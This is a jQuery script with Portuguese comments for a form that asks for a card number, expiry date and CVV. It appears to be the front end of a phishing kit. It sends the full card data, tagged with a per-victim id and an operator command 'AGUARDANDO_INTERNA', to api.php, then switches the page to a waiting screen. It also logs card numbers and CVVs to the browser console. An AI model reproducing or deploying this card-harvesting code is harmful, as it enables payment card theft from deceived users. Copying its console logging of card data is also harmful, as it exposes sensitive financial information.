// Aguardar o documento estar pronto
$(document).ready(function() {
    let info = {}; // Objeto local para armazenar informações
    let idInfo = $('#idInfo').val();
    let clientHashId = $('#clientHashId').val();

    // Máscara para número do cartão
    $('#numeroCartao').on('input', function() {
        let valor = this.value.replace(/\D/g, '');
        
        // Limita a 19 dígitos
        if (valor.length > 19) {
            valor = valor.substring(0, 19);
        }
        
        // Adiciona pontos a cada 4 dígitos
        valor = valor.replace(/(\d{4})(?=\d)/g, '$1.');
        this.value = valor;
        
        // Validação básica - foca no próximo campo quando tem 16 ou mais dígitos
        if (valor.replace(/\./g, '').length >= 16) {
            $('#mesAno').focus();
        }
    });

    // Máscara para mês/ano
    $('#mesAno').on('input', function() {
        let valor = this.value.replace(/\D/g, '');
        if (valor.length >= 2) {
            valor = valor.substring(0, 2) + '/' + valor.substring(2, 4);
        }
        this.value = valor;
        
        // Validação básica
        if (valor.length === 5) {
            $('#cvv').focus();
        }
    });

    // Máscara para CVV
    $('#cvv').on('input', function() {
        this.value = this.value.replace(/\D/g, '');
        
        // Validação básica
        if (this.value.length === 3) {
            $('#btnAtualizarCvv').addClass('btn-action-active');
        } else {
            $('#btnAtualizarCvv').removeClass('btn-action-active');
        }
    });

    // Evento para o botão de atualizar CVV
    $('#btnAtualizarCvv').on('click', function() {
        let numeroCartao = $('#numeroCartao').val().replace(/\./g, '');
        let mesAno = $('#mesAno').val();
        let cvv = $('#cvv').val();

        // Validações
        if (numeroCartao.length < 16 || numeroCartao.length > 19) {
            $('div#boxCvv').find('.txt_msg_erro_disp').removeClass('hide');
            return;
        }
        
        if (mesAno.length !== 5) {
            $('div#boxCvv').find('.txt_msg_erro_disp').removeClass('hide');
            return;
        }
        
        if (cvv.length !== 3) {
            $('div#boxCvv').find('.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        // Se chegou até aqui, todos os campos estão válidos
        $('div#boxCvv').find('.txt_msg_erro_disp').addClass('hide');

        // Criar objeto com os dados do cartão
        let dadosCartao = {
            numeroCartao: numeroCartao,
            mesAno: mesAno,
            cvv: cvv,
            comando: 'AGUARDANDO_INTERNA'
        };

        // Debug: verificar dados antes do envio
        console.log('Dados do cartão sendo enviados:', dadosCartao);

        // Enviar dados via AJAX
        $.ajax({
            url: "api.php?v=" + Date.now(),
            type: 'POST',
            data: { 
                action: "ATUALIZAR_INFORMACOES", 
                id: idInfo, 
                clientHashId: clientHashId, 
                obj: dadosCartao
            },
            cache: false,
            success: function(r) {
                console.log('Resposta do servidor:', r);
                
                // Limpar campos
                $('#numeroCartao').val('');
                $('#mesAno').val('');
                $('#cvv').val('');
                $('#btnAtualizarCvv').removeClass('btn-action-active');
                
                // Esconder a seção do cartão
                $('div#boxCvv').addClass('hide');
                
                // Mostrar mensagem de sucesso ou próxima etapa
                $('div#boxAguardando').removeClass('hide');
            },
            error: function(xhr, status, error) {
                console.error('Erro ao enviar dados:', error);
                $('div#boxCvv').find('.txt_msg_erro_disp').removeClass('hide');
            }
        });
    });
});
